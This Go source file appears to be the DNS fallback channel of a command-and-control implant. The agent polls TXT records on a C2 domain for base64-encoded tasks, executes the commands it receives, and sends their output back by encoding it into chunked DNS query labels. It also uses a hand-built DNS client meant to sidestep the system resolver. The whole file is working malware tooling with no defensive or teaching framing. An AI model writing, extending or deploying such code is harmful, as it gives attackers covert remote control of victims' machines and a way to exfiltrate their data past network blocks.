package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"
)

// ─── DNS Beacon — Alternate C2 Channel ───────────────────────────────────────
//
// When HTTP is blocked, the agent falls back to DNS TXT-record polling.
// Protocol:
//   QUERY  → agent resolves <data>.<agentid>.<c2domain> for TXT records
//   RESULT → agent chunks output into 63-byte labels:
//             <chunkN>.<agentid>.data.<c2domain>   (A query, data in label)
//
// The server listens on UDP/TCP 53, parses the labels, and responds with
// base64-encoded JSON task objects in TXT records.
//
// Subdomain label format (agent→server, query exfil):
//   <hex_chunk>.<seqno>.<agentid>.q.<c2domain>
//
// TXT response format (server→agent):
//   base64(JSON TaskObject)   — split across multiple TXT strings if needed

var (
	dnsMu       sync.Mutex
	dnsRunning  bool
	dnsDomain   string // e.g. "c2.example.com"
	dnsResolver string // e.g. "8.8.8.8:53"  — empty = system resolver
	dnsAgentID  string // set after first successful DNS checkin
	dnsStop     chan struct{}
)

// startDNSBeacon starts polling the DNS C2 channel.
// domain is the C2 domain, resolver is optional custom DNS server ("ip:port").
func startDNSBeacon(domain, resolver, agentID string) (string, error) {
	dnsMu.Lock()
	defer dnsMu.Unlock()

	if dnsRunning {
		return fmt.Sprintf("[*] DNS beacon already running on %s", dnsDomain), nil
	}

	dnsDomain   = domain
	dnsResolver = resolver
	dnsAgentID  = agentID
	dnsStop     = make(chan struct{})
	dnsRunning  = true

	go dnsBeaconLoop()
	return fmt.Sprintf("[+] DNS beacon started → %s (resolver: %s)", domain, resolverStr(resolver)), nil
}

func stopDNSBeacon() string {
	dnsMu.Lock()
	defer dnsMu.Unlock()
	if !dnsRunning {
		return "[*] DNS beacon not running"
	}
	close(dnsStop)
	dnsRunning = false
	return "[+] DNS beacon stopped"
}

func dnsBeaconStatus() string {
	dnsMu.Lock()
	defer dnsMu.Unlock()
	if !dnsRunning {
		return "[*] DNS beacon not running"
	}
	return fmt.Sprintf("[+] DNS beacon active → %s | agent: %s", dnsDomain, dnsAgentID)
}

// dnsBeaconLoop polls for tasks and sends results via DNS.
func dnsBeaconLoop() {
	ticker := time.NewTicker(15 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-dnsStop:
			return
		case <-ticker.C:
			if task := dnsPollTask(); task != nil {
				output, status := dispatch(task.Command)
				dnsExfilResult(task.ID, output, status)
			}
		}
	}
}

// dnsPollTask queries <agentid>.poll.<domain> for a TXT record containing a task.
func dnsPollTask() *Task {
	label := dnsAgentID
	if label == "" {
		label = "register"
	}
	qname := fmt.Sprintf("%s.poll.%s", label, dnsDomain)

	txts, err := dnsResolveTXT(qname)
	if err != nil || len(txts) == 0 {
		return nil
	}

	// Rejoin multi-string TXT into a single base64 payload
	combined := strings.Join(txts, "")
	data, err := base64.StdEncoding.DecodeString(combined)
	if err != nil {
		return nil
	}

	var task Task
	if err := json.Unmarshal(data, &task); err != nil {
		return nil
	}

	// If we got an agent ID assignment, save it
	if task.ID == "register" {
		dnsAgentID = task.Command
		return nil
	}

	return &task
}

// dnsExfilResult sends task output back to the C2 via DNS query exfiltration.
// Data is chunked into 63-byte hex-encoded labels:
//   <hex_chunk>.<seq>.<taskid>.<agentid>.r.<domain>
func dnsExfilResult(taskID, output, status string) {
	payload := map[string]string{"task_id": taskID, "output": output, "status": status}
	data, _ := json.Marshal(payload)
	encoded := base64.StdEncoding.EncodeToString(data)

	// Split into 60-char chunks (safe for DNS labels)
	chunkSize := 60
	chunks := splitChunks(encoded, chunkSize)

	// Each query: <chunk>.<seq>.<taskid>.<agentid>.r.<domain>
	for i, chunk := range chunks {
		qname := fmt.Sprintf("%s.%d.%s.%s.r.%s", chunk, i, taskID[:8], dnsAgentID[:8], dnsDomain)
		// Fire-and-forget: the query itself carries the data
		dnsResolveTXT(qname)
	}

	// Final "done" marker
	done := fmt.Sprintf("done.%d.%s.%s.r.%s", len(chunks), taskID[:8], dnsAgentID[:8], dnsDomain)
	dnsResolveTXT(done)
}

// dnsResolveTXT resolves TXT records for a name.
// Uses custom resolver if set, otherwise falls back to net.LookupTXT.
func dnsResolveTXT(name string) ([]string, error) {
	if dnsResolver == "" {
		return net.LookupTXT(name)
	}

	// Manual DNS query to custom resolver (avoids system resolver interception)
	conn, err := net.DialTimeout("udp", dnsResolver, 5*time.Second)
	if err != nil {
		return nil, err
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(5 * time.Second))

	// Build minimal DNS TXT query
	query := buildDNSQuery(name)
	conn.Write(query)

	buf := make([]byte, 4096)
	n, err := conn.Read(buf)
	if err != nil {
		return nil, err
	}

	return parseDNSTXTResponse(buf[:n])
}

// ─── Minimal DNS wire-format builder ─────────────────────────────────────────

var dnsSeq uint16

func buildDNSQuery(name string) []byte {
	dnsSeq++
	var msg []byte

	// Header: ID(2) + FLAGS(2) + QDCOUNT(2) + ANCOUNT(2) + NSCOUNT(2) + ARCOUNT(2)
	msg = append(msg, byte(dnsSeq>>8), byte(dnsSeq))
	msg = append(msg, 0x01, 0x00) // QR=0 OPCODE=0 RD=1
	msg = append(msg, 0x00, 0x01) // QDCOUNT=1
	msg = append(msg, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)

	// QNAME: each label length-prefixed, ends with 0x00
	labels := strings.Split(name, ".")
	for _, label := range labels {
		if len(label) == 0 {
			continue
		}
		if len(label) > 63 {
			label = label[:63]
		}
		msg = append(msg, byte(len(label)))
		msg = append(msg, []byte(label)...)
	}
	msg = append(msg, 0x00)

	// QTYPE=TXT(16) QCLASS=IN(1)
	msg = append(msg, 0x00, 0x10)
	msg = append(msg, 0x00, 0x01)
	return msg
}

func parseDNSTXTResponse(resp []byte) ([]string, error) {
	if len(resp) < 12 {
		return nil, fmt.Errorf("response too short")
	}

	ancount := int(resp[6])<<8 | int(resp[7])
	if ancount == 0 {
		return nil, nil
	}

	// Skip header (12 bytes) and question section
	off := 12
	// Skip QNAME
	for off < len(resp) {
		if resp[off] == 0 {
			off++
			break
		}
		if resp[off]&0xC0 == 0xC0 { // pointer
			off += 2
			break
		}
		off += int(resp[off]) + 1
	}
	off += 4 // skip QTYPE + QCLASS

	var txts []string
	for i := 0; i < ancount && off < len(resp); i++ {
		// Skip name
		for off < len(resp) {
			if resp[off] == 0 {
				off++
				break
			}
			if resp[off]&0xC0 == 0xC0 {
				off += 2
				break
			}
			off += int(resp[off]) + 1
		}
		if off+10 > len(resp) {
			break
		}
		rtype := int(resp[off])<<8 | int(resp[off+1])
		rdlen := int(resp[off+8])<<8 | int(resp[off+9])
		off += 10

		if rtype == 16 && off+rdlen <= len(resp) { // TXT record
			// TXT RDATA: series of length-prefixed strings
			end := off + rdlen
			pos := off
			for pos < end {
				strLen := int(resp[pos])
				pos++
				if pos+strLen <= end {
					txts = append(txts, string(resp[pos:pos+strLen]))
					pos += strLen
				}
			}
		}
		off += rdlen
	}
	return txts, nil
}

// ─── helpers ──────────────────────────────────────────────────────────────────

func splitChunks(s string, size int) []string {
	var chunks []string
	for len(s) > size {
		chunks = append(chunks, s[:size])
		s = s[size:]
	}
	if len(s) > 0 {
		chunks = append(chunks, s)
	}
	return chunks
}

func resolverStr(r string) string {
	if r == "" {
		return "system"
	}
	return r
}
